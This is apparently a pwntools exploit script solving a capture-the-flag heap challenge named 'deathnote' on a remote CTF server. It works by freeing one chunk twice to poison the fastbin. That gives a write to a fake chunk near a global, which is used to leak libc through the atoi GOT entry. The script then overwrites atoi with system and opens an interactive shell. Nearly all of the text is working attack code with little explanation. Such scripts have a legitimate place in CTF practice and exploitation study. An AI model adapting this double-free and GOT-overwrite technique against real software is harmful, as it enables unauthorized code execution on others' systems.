#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./deathnote')
context.terminal = ['kitty', '-e', 'sh', '-c']
host = args.HOST or 'chall.nitdgplug.org'
port = int(args.PORT or 30292)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def select_option(choice):
	io.recvuntil("> ")
	io.sendline(str(choice))

def add(idx, size, name):
	print(f"add {idx} {size} {name}")
	select_option(1)
	io.recvuntil("Enter the index:\n")
	io.send(str(idx))
	io.recvuntil("Enter the size:\n")
	io.send(str(size))
	io.recvuntil("Enter name:\n")
	io.send(name)

def update(idx, name):
	print(f"update {idx} {name}")
	select_option(2)
	io.recvuntil("Enter the index:\n")
	io.send(str(idx))
	io.recvuntil("Please update the data:\n")
	io.send(name)

def delete(idx):
	print(f"delete {idx}")
	select_option(3)
	io.recvuntil("Enter the index:\n")
	io.send(str(idx))
	print(io.recvline())

def show(idx):
	print(f"show {idx}")
	select_option(4)
	io.recvuntil("Enter the index:\n")
	io.send(str(idx))
	io.recvuntil("Your name:")
	return io.recvn(6)

# -- Exploit goes here --
libc = ELF("./libc.so.6")
io = start()
fake_fast_bin = 0x6020bd
add(5, 100, "AAAA")
add(6, 100, "AAAA")
delete(5)
delete(6)
delete(5)
add(0, 100, p64(fake_fast_bin)) #fd
add(1, 100, p64(fake_fast_bin)) #junk
add(2, 100, p64(fake_fast_bin)) #junk
add(3, 100, b"A" * 0x13 + b"B"*0x20 + p64(exe.got['atoi']))
libc.address = u64(show(0).ljust(8, b'\x00')) - libc.sym['atoi']
print(hex(libc.address))
update(0, p64(libc.sym['system']))
io.interactive()

